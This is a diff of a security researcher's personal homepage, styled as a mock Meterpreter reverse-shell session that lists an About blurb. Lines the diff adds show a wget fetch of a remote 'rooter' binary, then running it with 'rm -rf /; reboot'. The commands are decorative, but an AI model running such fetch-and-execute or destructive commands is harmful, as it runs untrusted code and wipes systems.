@@ -2,14 +2,14 @@
 <head>
     <title>anwarelmakrahy.localhost</title>
 </head>
-<body bgcolor="#242424" style="color: #ffffff; font-family: Monospace; width: 480pt" >
+<body bgcolor="#050505" style="color: #ffffff; font-family: Monospace; width: 480pt" >
 <pre>
 [*] Started reverse handler on 10.0.0.100:4444
 [*] Starting the payload handler...
 [*] Preparing support library (91752 bytes)...
 [*] Preparing metsrv library (29312 bytes)...
 [*] Sending stage (121072 bytes) to 10.0.0.100
-[*] Meterpreter session 1 opened (10.0.0.100:4444 -> 10.0.0.100:37047)
+[*] Meterpreter session 31337 opened (10.0.0.100:4444 -> 10.0.0.101:37047)
 
 meterpreter > shell
 
@@ -22,6 +22,22 @@ meterpreter > shell
   ▀                   ▀                                ▀           's website
 
 ~$ tree ~/www
+/home/anwarelmakrahy/www
+│
+├─── About
+│     │
+│     └── Anwar Mohamed, another security researcher focusing on system exploitation
+│         and exploit development for mobile platforms specially those based on
+│         linux kernel.
+│
+└─── To be continued
+
+-$
+-$
+-$ wget -q http://anwarelmakrahy.com/rooter
+-$ ./rooter -c 'rm -rf /; reboot'
+ 
+[*] 10.0.0.101 - Meterpreter session 31337 closed.  Reason: Died
 </pre>
 </body>
 </html>
